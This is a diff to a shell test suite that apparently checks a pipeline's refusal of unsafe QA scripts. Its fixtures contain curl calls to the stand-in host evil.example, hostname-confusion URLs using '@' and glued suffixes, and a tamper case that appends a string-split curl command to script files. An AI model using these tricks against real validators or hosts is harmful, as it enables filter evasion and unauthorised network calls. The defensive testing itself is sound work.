@@ -202,10 +202,12 @@ $v" '{type: "result", result: $r}' ;;
           printf '## a comment that looks like a heading\n'
           printf 'echo \047a ````fenced```` word\047\n'
           case "$QA_SCRIPT" in
-            pass) printf 'echo "PASS: publish refuses a bad reminder"\necho "  PASS: delay is stamped"\n' ;;
+            pass) printf 'curl -s "${QA_BASE_URL:-https://app.test:18443}/x" >/dev/null\necho "PASS: publish refuses a bad reminder"\necho "  PASS: delay is stamped"\n' ;;
             fail) printf 'echo "PASS: publish refuses a bad reminder"\necho "FAIL: delay is stamped (expected delay, got action)"\nexit 1\n' ;;
             url)  printf 'curl -s https://evil.example/x\necho "PASS: x"\n' ;;
             at)   printf 'curl -s "https://app.test:18443@evil.example/x"\necho "PASS: x"\n' ;;
+            bare) printf 'curl -s "https://app.test:18443/x"\necho "PASS: x"\n' ;;
+            glued) printf 'curl -s "https://app.test:18443"".evil.example/x"\necho "PASS: x"\n' ;;
             suffix) printf 'curl -s "https://app.test:18443.evil.example/x"\necho "PASS: x"\n' ;;
             tamper) printf 'for f in "$0" %q; do echo "curl ht""tps:""//e""vil.example/t" >> "$f"; done\necho "PASS: x"\n' "$EA_AGENT_DIR/state/pr-pipeline/2025-11-10T10-00-00Z-ticket-gh-7/qa/qa-script.sh" ;;
           esac
@@ -830,6 +832,10 @@ eq "the served URL followed by @ is refused" 1 "$(QA_SCRIPT=at run)"
 qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "the served URL extended into another host is refused" 1 "$(QA_SCRIPT=suffix run)"
 [ -e "$ST/script.call" ] && bad "a script naming served-url.evil ran" || ok "a script naming served-url.evil never runs"
+for m in bare glued; do
+  qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
+  eq "the served URL outside \${QA_BASE_URL:-...} is refused (${m})" 1 "$(QA_SCRIPT=$m run)"
+done
 
 qa_jira "{ mark_ready: true, ci: { fix_attempts: 0 }, $QA_SCRIPT_SRV }"
 eq "a script that rewrites itself still passes" 0 "$(QA_SCRIPT=tamper run)"
